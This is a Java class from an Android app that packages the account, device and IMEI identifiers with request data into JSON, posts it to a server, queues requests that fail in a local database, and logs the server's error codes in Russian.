package com.inet.android.request;

import java.io.IOException;

import org.json.JSONArray;
import org.json.JSONException;
import org.json.JSONObject;

import com.inet.android.bs.Caller;
import com.inet.android.db.RequestDataBaseHelper;
import com.inet.android.db.RequestWithDataBase;
import com.inet.android.utils.Logging;

import android.content.Context;
import android.content.SharedPreferences;
import android.content.SharedPreferences.Editor;
import android.os.AsyncTask;
import android.preference.PreferenceManager;

public class OnDemandRequest extends DefaultRequest {
	private final String LOG_TAG = "OnDemandRequest";
	private final int type = 5;
	private int infoType;
	Context ctx;
	static RequestDataBaseHelper db;
	SharedPreferences sp;

	public OnDemandRequest(Context ctx, int infoType) {
		super(ctx);
		this.ctx = ctx;
		this.infoType = infoType;
		sp = PreferenceManager.getDefaultSharedPreferences(ctx);
	}

	@Override
	public void sendRequest(String request) {
		RequestTask srt = new RequestTask();

		srt.execute(request);
	}

	class RequestTask extends AsyncTask<String, Void, Void> {

		@Override
		protected void onPreExecute() {
			super.onPreExecute();
		}

		@Override
		protected Void doInBackground(String... strs) {
			sendPostRequest(strs[0]);
			return null;
		}

		@Override
		protected void onPostExecute(Void result) {
			super.onPostExecute(result);
		}
	}

	@Override
	protected void sendPostRequest(String request) {
		Logging.doLog(LOG_TAG, "1: " + request, "1: " + request);
		if (!request.equals(" ")) {
			// w
			SharedPreferences sp = PreferenceManager
					.getDefaultSharedPreferences(ctx);
			JSONObject jsonObject = new JSONObject();
			JSONArray jsonArray = new JSONArray();
			String requestArray = null;
			try {
				jsonObject.put("account", sp.getString("account", "0000"));
				jsonObject.put("device", sp.getString("device", "0000"));
				jsonObject.put("imei", sp.getString("imei", "0000"));
				jsonObject.put("key", System.currentTimeMillis());
				jsonObject.put("type", infoType);
				jsonObject.put("version", sp.getString("version", "0"));

				requestArray = "[" + request + "]";
				jsonArray = new JSONArray(requestArray);
				jsonObject.put("data", jsonArray);

				Logging.doLog(LOG_TAG, "jsonArray: " + jsonArray.toString(),
						jsonObject.toString());

			} catch (JSONException e1) {
				Logging.doLog(LOG_TAG, "json сломался", "json сломался");
				e1.printStackTrace();
			}

			String str = null;
			try {
				Logging.doLog(LOG_TAG, "do make.request: " + request,
						"do make.request: " + request);
				Logging.doLog(LOG_TAG, "do make.requestArray: " + requestArray,
						"do make.requestArray: " + requestArray);

				str = Caller.doMake(jsonObject.toString(), "list", ctx);
			} catch (IOException e) {
				// Добавление в базу request
				e.printStackTrace();

				Logging.doLog(LOG_TAG, "db.request: " + request, "db.request: "
						+ request);

				db = new RequestDataBaseHelper(ctx);
				db.addRequest(new RequestWithDataBase(request, type));
			}
			if (str != null) {
				getRequestData(str);
			} else {
				Logging.doLog(LOG_TAG, "ответа от сервера нет",
						"ответа от сервера нет");
			}
		} else {

			Logging.doLog(LOG_TAG, "request == null", "request == null");

		}
	}

	@Override
	protected void getRequestData(String response) {
		Logging.doLog(LOG_TAG, "getResponseData: " + response,
				"getResponseData: " + response);

		Editor ed = sp.edit();

		JSONObject jsonObject = null;
		try {
			jsonObject = new JSONObject(response);
		} catch (JSONException e) {
			if (response == null) {
				Logging.doLog(LOG_TAG, "json null", "json null");
			}
			return;
		}

		String str = null;
		try {
			str = jsonObject.getString("code");
		} catch (JSONException e) {
			e.printStackTrace();
		}
		if (str != null) {
			ed.putString("code", str);
		} else {
			ed.putString("code", "code");
		}

		if (str.equals("1")) {
			try {
				str = jsonObject.getString("version");
			} catch (JSONException e) {
				e.printStackTrace();
			}
			if (str != null) {
				ed.putString("version", str);
				ed.commit();
			} else {
				ed.putString("version", "version");
			}
		}

		if (str.equals("0")) {
			try {
				str = jsonObject.getString("error");
			} catch (JSONException e) {
				str = null;
			}
			if (str != null) {
				ed.putString("error", str);
			} else {
				ed.putString("error", "error");
			}
			if (str.equals("0")) {
				Logging.doLog(LOG_TAG, "account не найден", "account не найден");

				ed.putString("account", "account");
			}
			if (str.equals("1")) {
				Logging.doLog(LOG_TAG,
						"imei отсутствует или имеет неверный формат",
						"imei отсутствует или имеет неверный формат");
			}
			if (str.equals("2"))
				Logging.doLog(LOG_TAG, "устройство с указанным imei уже есть",
						"устройство с указанным imei уже есть");
			if (str.equals("3"))
				Logging.doLog(LOG_TAG, "отсутствует ключ", "отсутствует ключ");
			if (str.equals("4")) {
				Logging.doLog(LOG_TAG, "отсутствует или неверный type",
						"отсутствует или неверный type");
			}
			if (str.equals("5")) {
				Logging.doLog(LOG_TAG, "версия не найдена", "версия не найдена");
			}
			if (str.equals("6")) {
				Logging.doLog(LOG_TAG,
						"type пакета не совпадает с версией на сервере",
						"type пакета не совпадает с версией на сервере");
			}
			if (str.equals("7")) {
				Logging.doLog(LOG_TAG, "другое", "другое");
			}
		}

		ed.commit();
	}

}
